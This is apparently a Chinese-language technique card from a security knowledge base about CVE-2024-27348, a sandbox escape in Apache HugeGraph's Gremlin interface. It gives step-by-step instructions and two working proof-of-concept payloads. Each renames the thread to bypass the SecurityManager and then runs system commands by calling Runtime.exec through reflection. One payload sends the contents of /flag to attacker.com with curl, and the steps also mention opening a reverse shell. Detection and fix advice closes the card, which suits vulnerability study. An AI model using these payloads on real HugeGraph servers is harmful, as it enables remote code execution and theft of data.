---
id: binary-pwn-sandbox-escape-hugegraph-gremlin-threadname-securitymanager-bypass
title: Apache HugeGraph Gremlin 沙箱逃逸：把线程名改为非 Gremlin 工作线程名使 callFromGremlin 返回 false，绕过 SecurityManager 后反射执行 Runtime.exec（CVE-2024-27348）
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: hugegraph-gremlin-threadname-securitymanager-bypass
aliases:
- CVE-2024-27348
- HugeGraph RCE
- Gremlin sandbox escape
- HugeSecurityManager
- 线程名绕过 SecurityManager
tags:
- java
- hugegraph
- gremlin
- securitymanager
- sandbox-escape
- rce
- cve
cve:
- CVE-2024-27348
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-09'
verification:
  verified_by: verifier-V411-fix
  verified_at: '2026-11-09T15:02:34+08:00'
  notes: V411 按原文截图复核确认原卡方向写反并已修正：checkExec 仅在 callFromGremlin() 为 true 时抛异常，而 callFromGremlin 要求线程名 startsWith('gremlin-server-exec')/'task-worker' 且栈含 GremlinGroovyScriptEngine；正确利用是把线程名改为不匹配的名字（原文用 evil）使检查放行，而非改成 gremlin-server-exec。已反转标题/一句话结论/原理/触发条件/步骤2/步骤5/两段 PoC 的线程名，并保留 Runtime.exec 需 sh -c 的修正。原验证者 V168（2026-11-06）未对照源码方向。
---

## 一句话结论

Apache HugeGraph 的 Gremlin 脚本沙箱依赖 `HugeSecurityManager` 做危险操作拦截，而 `checkExec`/`checkPermission` 只在 `callFromGremlin()` 为 true 时抛异常；`callFromGremlin()` 要求“线程名以 `gremlin-server-exec` 或 `task-worker` 开头且调用栈包含 `GremlinGroovyScriptEngine`”。攻击者在脚本里把当前线程改名为**不匹配**的名字（如 `evil`），使 `callFromGremlin()` 返回 false，检查直接放行，再用反射取 `java.lang.Runtime` 并调用 `exec`，即可在沙箱内执行任意系统命令（CVE-2024-27348）。

## 原理

- HugeGraph 通过 Gremlin Server 执行用户提交的图查询/脚本，并用自定义 `SecurityManager` 限制 `Runtime.exec`、文件访问、类加载等敏感操作。
- 该版本的安全判断没有基于完整调用栈或 `AccessController` 的权限域，而是信任“当前调用是不是来自 Gremlin 工作线程”这一可被脚本修改的属性：`callFromGremlin()` 只在“线程名以 `gremlin-server-exec`/`task-worker` 开头且栈中含 `GremlinGroovyScriptEngine`”时返回 true，`checkExec` 此时才抛 “Not allowed to execute command via Gremlin”；条件不满足时直接放行。
- Gremlin 脚本本身可以调用 Java API，包括 `Thread.currentThread().setName(...)`；把线程改成**不匹配**的名字（原文载荷用 `evil`）后，`callFromGremlin()` 因线程名/栈条件不满足返回 false，`checkExec`/`checkPermission` 不再抛异常，检查被绕过。
- 反射链：`Class.forName("java.lang.Runtime")` → `getMethod("exec", String.class)` → `invoke(Runtime.getRuntime(), cmd)`。`Class.forName`/`getMethod`/`invoke` 是 Java 反射的标准入口，不需要额外 gadget。
- 本质：安全决策依赖可变的、由被约束代码控制的“上下文标记”（线程名、线程局部变量、类加载器），而不是不可伪造的权限凭证；被约束代码只要能写这个标记，就能自我授权。

## 触发条件

- 目标暴露 Gremlin Server/HTTP Gremlin 接口，允许提交并执行脚本（通常需要具备相应权限；CVE 的具体认证前置条件以厂商公告为准）。
- 运行的是受 CVE-2024-27348 影响的 HugeGraph-Server 版本（文章未给出具体版本区间，使用前需按公告核对）。
- `HugeSecurityManager` 的拦截判断可被脚本内的 `Thread.setName` 影响：改成非 `gremlin-server-exec`/`task-worker` 的名字，即可让 `callFromGremlin()` 返回 false、检查放行。
- 进程权限足以执行命令/读取 flag（通常为服务账号）。

## 利用步骤

1. 确认 Gremlin 端点可执行脚本，提交简单表达式（如 `1+1`）验证。
2. 在脚本内把当前线程改成不匹配 Gremlin 工作线程的名字（原文用 `evil`）：
   ```java
   Thread.currentThread().setName("evil");
   ```
3. 反射取 `Runtime` 并执行命令；注意 `Runtime.exec(String)` 不经过 shell，命令替换/管道要用 `sh -c` 包起来：
   ```java
   Class<?> c = Class.forName("java.lang.Runtime");
   java.lang.reflect.Method m = c.getMethod("exec", String.class);
   m.invoke(Runtime.getRuntime(), "sh -c 'id > /tmp/hg_out'");
   ```
4. 读取命令输出（写文件后通过图查询/HTTP 回显，或直接反弹 shell）。
5. 确认线程名条件：名字以 `gremlin-server-exec`/`task-worker` 开头且栈含 `GremlinGroovyScriptEngine` 时会被拦截，因此要改成不匹配的名字（如 `evil`）；可先用 `Thread.getAllStackTraces()` 观察默认工作线程名。

## PoC

```java
// 文章给出的简化载荷（线程名改为不匹配的 evil）
Thread.currentThread().setName("evil");
Class clazz = Class.forName("java.lang.Runtime");
java.lang.reflect.Method exec = clazz.getMethod("exec", String.class);
exec.invoke(Runtime.getRuntime(), "curl attacker.com/$(cat /flag)");
```

```java
// 修正版：Runtime.exec(String) 不经过 shell，需显式 sh -c
Thread.currentThread().setName("evil");
Class<?> c = Class.forName("java.lang.Runtime");
java.lang.reflect.Method m = c.getMethod("exec", String.class);
Process p = (Process) m.invoke(Runtime.getRuntime(), "sh -c 'cat /flag'");
```

## 变体与关联

- 同类“可伪造上下文”缺陷：基于 `ThreadLocal` 角色标记、基于 `ContextClassLoader`、基于 HTTP Header/内部 IP 的权限判断；只要被沙箱代码能改写标记，就能提权。
- 若 `SecurityManager` 拦截 `Class.forName`，可尝试 `ClassLoader.loadClass`、`MethodHandles.Lookup`、`sun.misc.Unsafe` 等替代反射入口。
- 关联：[[binary-pwn-sandbox-escape-graalvm-hostaccess-all-getclass-rce]]（GraalVM 宿主访问放开后的反射逃逸）、[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]（JVM 语言沙箱的反射黑名单盲区）。
- 边界：新版 HugeGraph 可能已移除/加强该检查；文章是简化示意，未给出完整 Gremlin 请求体、认证前置与版本区间，实际利用需按目标版本验证。

## 检测与防御

- 检测：审计 `SecurityManager`/自定义沙箱的 `checkPermission`、`checkExec` 实现，凡是依赖线程名、线程局部变量、类加载器等可写上下文的判断都标记为高风险；监控 Gremlin 脚本中的 `Thread.setName`、`Class.forName`、`getMethod`、`invoke` 组合。
- 修复：升级到厂商修复版本；不要用线程名做授权；改用 `AccessController.doPrivileged` + 独立 `ProtectionDomain`/`CodeSource` 的权限模型，或把脚本执行放进独立进程/容器。
- 加固：对 Gremlin 脚本做 AST/白名单限制，禁用反射与 `java.lang` 访问；服务以低权限用户运行，限制出网与文件系统；关闭不必要的 Gremlin 脚本执行能力。
